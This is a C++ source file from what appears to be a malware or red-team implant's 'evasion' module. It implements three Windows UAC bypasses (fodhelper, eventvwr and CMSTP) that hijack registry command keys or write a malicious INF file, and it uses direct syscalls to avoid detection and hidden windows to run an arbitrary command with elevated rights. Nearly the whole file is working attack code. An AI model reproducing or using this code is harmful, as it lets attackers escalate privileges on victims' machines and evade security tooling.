#include "UACBypass.h"
#include "../utils/Shared.h"
#include "../utils/Logger.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include <windows.h>
#include <shellapi.h>

namespace evasion {

bool UACBypass::Execute(const std::wstring& command) {
    if (utils::IsAdmin()) {
        LOG_INFO("Already admin, no need for UAC bypass.");
        return true;
    }

    LOG_INFO("Attempting UAC Bypass: Fodhelper");
    if (Fodhelper(command)) return true;

    LOG_INFO("Attempting UAC Bypass: Eventvwr");
    if (Eventvwr(command)) return true;

    // CMSTP is noisier, try last
    LOG_INFO("Attempting UAC Bypass: CMSTP");
    if (Cmstp(command)) return true;

    return false;
}

bool UACBypass::Fodhelper(const std::wstring& command) {
    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
    UNICODE_STRING uHkcu;
    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hHkcu = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) return false;

    std::wstring relativePath = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    HANDLE hKey = NULL;
    status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);
    if (NT_SUCCESS(status)) {
        // Set Default value to command
        UNICODE_STRING uEmpty = {0, 0, NULL};
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)command.c_str(), (PVOID)(UINT_PTR)((command.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);

        // Set DelegateExecute to empty
        std::wstring de = L"DelegateExecute";
        UNICODE_STRING uDe;
        uDe.Buffer = (PWSTR)de.c_str();
        uDe.Length = (USHORT)(de.length() * sizeof(wchar_t));
        uDe.MaximumLength = uDe.Length + sizeof(wchar_t);
        std::wstring emptyVal = L"";
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uDe, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)emptyVal.c_str(), (PVOID)(UINT_PTR)((emptyVal.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);

        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

        // Execute fodhelper
        ShellExecuteW(NULL, L"open", L"fodhelper.exe", NULL, NULL, SW_HIDE);

        // Wait and cleanup
        Sleep(2000);
        // Cleaning up registry would be good, but for now let's just hope it worked.
        // In a real scenario we'd want to delete the keys.
        return true;
    }

    InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    return false;
}

bool UACBypass::Eventvwr(const std::wstring& command) {
    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
    UNICODE_STRING uHkcu;
    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hHkcu = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (!NT_SUCCESS(status)) return false;

    std::wstring relativePath = L"Software\\Classes\\mscfile\\shell\\open\\command";
    HANDLE hKey = NULL;
    status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);
    if (NT_SUCCESS(status)) {
        UNICODE_STRING uEmpty = {0, 0, NULL};
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)command.c_str(), (PVOID)(UINT_PTR)((command.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);
        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

        ShellExecuteW(NULL, L"open", L"eventvwr.exe", NULL, NULL, SW_HIDE);
        Sleep(2000);
        return true;
    }

    InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    return false;
}

bool UACBypass::Cmstp(const std::wstring& command) {
    // CMSTP usually requires an INF file.
    // We can try to write a temporary INF file.
    wchar_t tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring infPath = std::wstring(tempPath) + L"tmp.inf";

    std::wstring infContent =
        L"[version]\nSignature=$chicago$\nAdvancedINF=2.5\n"
        L"[DefaultInstall]\nCustomDestinationAttributes=CustInstDestSectionAllUsers\nRunPreSetupCommands=RunPreSetupCommandsSection\n"
        L"[RunPreSetupCommandsSection]\n" + command + L"\ntaskkill /F /IM cmstp.exe\n"
        L"[CustInstDestSectionAllUsers]\n49001=Queries,5\n"
        L"[Queries]\ndatpath=\"\"\n";

    HANDLE hFile = CreateFileW(infPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        std::string sContent = utils::ws2s(infContent);
        WriteFile(hFile, sContent.c_str(), (DWORD)sContent.length(), &written, NULL);
        CloseHandle(hFile);

        std::wstring args = L"/ni /s " + infPath;
        ShellExecuteW(NULL, L"open", L"cmstp.exe", args.c_str(), NULL, SW_HIDE);
        Sleep(2000);
        DeleteFileW(infPath.c_str());
        return true;
    }
    return false;
}

} // namespace evasion
